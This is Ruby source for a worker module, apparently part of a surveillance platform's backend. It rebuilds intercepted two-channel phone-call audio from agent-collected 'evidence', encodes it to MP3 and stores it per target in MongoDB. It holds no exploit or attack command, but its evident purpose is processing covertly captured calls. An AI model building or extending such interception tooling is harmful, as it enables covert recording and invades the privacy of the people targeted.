module RCS
module Worker

require 'ffi'
require 'mongo'
require 'mongoid'
require 'stringio'
require 'digest/md5'

require 'rcs-common/trace'

require_relative 'speex'
require_relative 'wave'
require_relative 'src'
require_relative 'mp3lame'

class AudioProcessingError < StandardError
  attr_reader :msg
  def initialize(msg)
    @msg = msg
  end

  def to_s
    @msg
  end
end

class Channel
  include Tracer
  attr_reader :name, :sample_rate, :start_time, :last_stop_time, :wav_data, :status
  
  def initialize(evidence)
    @id = BSON::ObjectId.new
    @name = evidence[:data][:channel].to_s
    @sample_rate = evidence[:data][:sample_rate]
    @start_time = evidence[:data][:start_time]
    @last_stop_time = @start_time
    @needs_resampling = @sample_rate
    @resampled = false
    @wav_data = Array.new # array of 32 bit float samples
    @status = :open
    trace :debug, "[CHAN #{to_s}] CREATING NEW CHANNEL #{@name} - start_time: #{@start_time} sample_rate: #{@sample_rate}"
  end
  
  def id
    "#{@name}:#{@sample_rate}:#{@start_time.to_f}:#{@last_stop_time.to_f}:#{@status.to_s}"
  end
  
  def self.other_than channel
    channel == :incoming ? :outgoing : :incoming
  end
  
  def close!
    @status = :closed
    trace :debug, "[CHAN #{to_s}] closing channel #{self.id}"
  end
  
  def closed?
    @status == :closed
  end

  def resampled?
    @resampled
  end

  def needs_resampling?
    @needs_resampling != @sample_rate
  end

  def resample_channel(sample_rate)
    trace :debug, "[CHAN #{to_s}] resampling channel from #{@sample_rate} to #{sample_rate}"
    @wav_data = SRC::Resampler.new(sample_rate).resample_channel(@wav_data, @sample_rate) unless sample_rate == @sample_rate
    @needs_resampling = sample_rate
    @resampled = true
  end

  def resample(evidence)
    return evidence if @needs_resampling == @sample_rate
    #trace :debug, "[CHAN #{to_s}:resample] evidence wav #{evidence[:wav].size} frames from #{@sample_rate} to #{@needs_resampling}"
    evidence[:wav] = SRC::Resampler.new(@needs_resampling).resample_channel evidence[:wav], @sample_rate
    trace :debug, "[CHAN #{to_s}:resample] evidence wav resampled to #{evidence[:wav].size} frames @ #{@needs_resampling}"
    evidence
  end
  
  def fill(gap)
    samples_to_fill = @needs_resampling * gap
    trace :debug, "[CHAN #{to_s}] filling with #{samples_to_fill} samples(@#{@needs_resampling}) to fill #{gap} seconds of missing data."
    @wav_data.concat [0.0] * samples_to_fill.ceil
  end
  
  def time_gap(evidence)
    gap = evidence[:data][:start_time].to_f - @last_stop_time.to_f
    #trace :debug, "[CHAN #{to_s}]#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
    trace :fatal, "[CHAN #{to_s}] *** NEGATIVE GAP #{gap} ***" if gap < 0
    gap
  end
  
  def accept?(evidence)
    if closed? 
      trace :debug, "[CHAN #{to_s}] CHANNEL IS CLOSED, REFUSING ..."
      return false
    end
    gap = time_gap(evidence)
    if gap >= 5.0
      trace :debug, "[CHAN #{to_s}] TIME GAP IS #{gap} SECONDS !!! REFUSING ..."
      return false
    end
    return true
  end
  
  def feed(evidence)
    gap = time_gap(evidence)
    fill gap unless gap == 0
    
    @last_stop_time = evidence[:data][:stop_time]
    @wav_data.concat evidence[:wav]
    #trace :debug, "[CHAN #{to_s}] #{num_frames} frames, NEW STOP TIME #{@last_stop_time}"
  end

  def num_frames
    @wav_data.size
  end

  def to_s
    "#{@id}:#{name}:#{sample_rate}:#{wav_data.size}"
  end
end

class Call
  include Tracer
  attr_writer :start_time
  attr_reader :id, :peer
  
  # status of call can be:
  #   - :queueing only first channel is present, queue data, maintain speex
  #   - :fillin   second channel arrived, fill in later channel with silence
  #   - :resampling second channel arrived, filled in, resample data as they arrive
  
  def initialize(peer, program, start_time, agent, target)
    @id = "#{agent[:ident]}_#{agent[:instance]}_#{BSON::ObjectId.new}"
    @peer = peer
    @start_time = start_time
    @status = :queueing
    @channels = {}
    @program = program
    @duration = 0
    trace :info, "[CALL #{@id}] created new call for #{@peer}, starting at #{@start_time}"
    @raw_ids = []
    @sample_rate = nil

    @agent = agent
    @target = target

    @evidence = store peer, program, start_time, agent, target
  end

  def id
    "#{@peer}:#{@start_time.to_f}"
  end

  def single_channel?
    @status == :single_channel
  end

  def dual_channel?
    @status == :dual_channel
  end

  def queueing?
    @status == :queueing
  end

  def accept?(evidence)
    # peer must be the same!
    return false if evidence[:data][:peer] != @peer

    # we accept evidence only if relative channel accept it
    channel = get_channel evidence
    return true unless channel.nil?
    return false
  end

  def end_call?(evidence)
    return true if evidence[:data][:grid_content].bytesize == 4 and evidence[:data][:grid_content] == "\xff\xff\xff\xff"
  end
  
  def get_channel(evidence)
    channel = @channels[evidence[:data][:channel]] 
    channel ||= create_channel(evidence)
    return channel if channel.accept? evidence
    return nil
  end

  def num_channels
    @channels.values.size
  end
  
  def create_channel(evidence)
    @channels[evidence[:data][:channel]] ||= Channel.new evidence

    # fix start time
    a = channels_by_start_time
    @start_time = a[0].start_time

    # when we have both channels
    trace :debug, "we have #{num_channels} channels now #{@channels.values.collect {|c| c.to_s}}"

    if num_channels == 2
      #determine common sample rate
      @sample_rate = (@channels.values.min_by {|c| c.sample_rate}).sample_rate

      #resample channels (if necessary)
      @channels.values.each {|c| c.resample_channel(@sample_rate) unless c.resampled?}

      # fill in later channel
      fillin_gap = a[1].start_time - a[0].start_time
      #trace :debug, "[CALL #{@id}] FILLING #{fillin_gap.to_f} SECS ON CHANNEL #{a[1].name}"
      a[1].fill(fillin_gap)
    end

    return @channels[evidence[:data][:channel]]
  end

  def close!
    @channels.each_value {|c| c.close!}
    trace :debug, "[CALL #{@id}] closing call for #{@peer}, starting at #{@start_time}"
    @evidence.update_attributes("status" => :complete)
    true
  end
  
  def closed?
    closed_channels = @channels.select {|k,v| v.closed? unless v.nil? }
    return closed_channels.size == @channels.size
  end
  
  def feed(evidence)

    @raw_ids << evidence[:db_id]

    # if evidence is empty or call is closed, refuse feeding
    return false if evidence[:wav].size == 0
    return false if closed?
    return close! if end_call? evidence

    # get the correct channel for the evidence
    channel = get_channel(evidence)
    #return false if channel.nil?

    evidence = channel.resample evidence if channel.needs_resampling?
    
    trace :debug, "[CALL #{@id}] feeding #{evidence[:wav].size} frames at #{evidence[:data][:start_time]}:#{evidence[:data][:last_stop_time]} to #{channel.id}"
    channel.feed evidence
    
    # update status
    update_status
    
    unless queueing?
      if dual_channel?
        num_samples = [@channels[:outgoing].wav_data.size, @channels[:incoming].wav_data.size].min

        left_pcm = @channels[:outgoing].wav_data.shift num_samples
        right_pcm = @channels[:incoming].wav_data.shift num_samples

        # MP3Encoder will take care of resampling if necessary
        @encoder ||= ::MP3Encoder.new(2, @sample_rate)
        unless @encoder.nil?
          @encoder.feed(left_pcm, right_pcm) do |mp3_bytes|
            File.open("#{file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }

            db = Mongoid.database
            fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")

            fs.open(file_name, 'a') do |f|
              f.write mp3_bytes
              update_attributes("data._grid" => f.files_id)
              update_attributes("data._grid_size" => f.file_length)
            end
            yield mp3_bytes if block_given?
          end
        end
      elsif single_channel?
        channel = @channels.values[0]

        left_pcm = channel.wav_data.shift(channel.wav_data.size)
        right_pcm = Array.new left_pcm

        # MP3Encoder will take care of resampling if necessary
        @encoder ||= ::MP3Encoder.new(2, channel.sample_rate)
        unless @encoder.nil?
          @encoder.feed(left_pcm, right_pcm) do |mp3_bytes|
            File.open("#{file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }

            db = Mongoid.database
            fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")

            fs.open(file_name, 'a') do |f|
              f.write mp3_bytes
              update_attributes("data._grid" => f.files_id)
              update_attributes("data._grid_size" => f.file_length)
            end
            yield mp3_bytes if block_given?
          end
        end
      end
    end

    return true
  end

  def update_attributes(hash)
    @evidence.update_attributes(hash)
  end

  def store(peer, program, start_time, agent, target)
    evidence = ::Evidence.collection_class(target[:_id].to_s)
    evidence.create do |ev|
      ev.aid = agent[:_id].to_s
      ev.type = :call

      ev.da = start_time
      ev.dr = Time.now.to_i
      ev.rel = 0
      ev.blo = false
      ev.note = ""

      ev.data ||= Hash.new
      ev.data[:peer] = peer
      ev.data[:program] = program
      ev.data[:duration] = 0
      ev.data[:status] = :recording

      ev.save
    end
  end

  def file_name
    "#{@id}_#{@peer}_#{@program}"
  end

  def sample_rates
    @channels.values.collect {|c| c.sample_rate}
  end

  def min_sample_rate
    sample_rates.sort.first
  end
  
  def update_status
    case num_channels
      when 1
        channel = @channels.values[0]
        gap = channel.last_stop_time - channel.start_time
        @status = :single_channel if gap > 15
        trace :debug, "[CALL #{@id}] call status is #{@status}, channel #{channel.name} gap is #{gap}"
      when 2
        @status = :dual_channel
        trace :debug, "[CALL #{@id}] call status is #{@status}"
    end
  end

  def channels_by_start_time
    @channels.values.minmax_by {|c| c.start_time }
  end
end

class CallProcessor
  include Tracer

  def initialize(agent, target)
    @agent = agent
    @target = target
    @call = nil
  end
  
  def get_call(evidence)
    # if peer is unknown or evidence is empty, evidence is invalid, ignore it
    #trace :debug, "EVIDENCE WAV NIL? #{evidence[:wav].nil?}"
    return nil if evidence[:data][:peer].empty? or evidence[:wav].empty?
    return create_call(evidence) if @call.nil? # first call
    return @call if @call.accept? evidence and not @call.closed?
    return create_call(evidence) # previous call ended
  end
  
  def create_call(evidence)
    @call.close! unless @call.nil?
    @call = Call.new(evidence[:data][:peer], evidence[:data][:program], evidence[:data][:start_time], @agent, @target)
    @call
  end
  
  def feed(evidence)
    call = get_call evidence
    unless call.nil?
      call.feed evidence do |mp3_bytes|

      end
    end
    nil
  end
  
  def to_s
    @call.to_s
  end
end

end # Worker::
end # RCS::
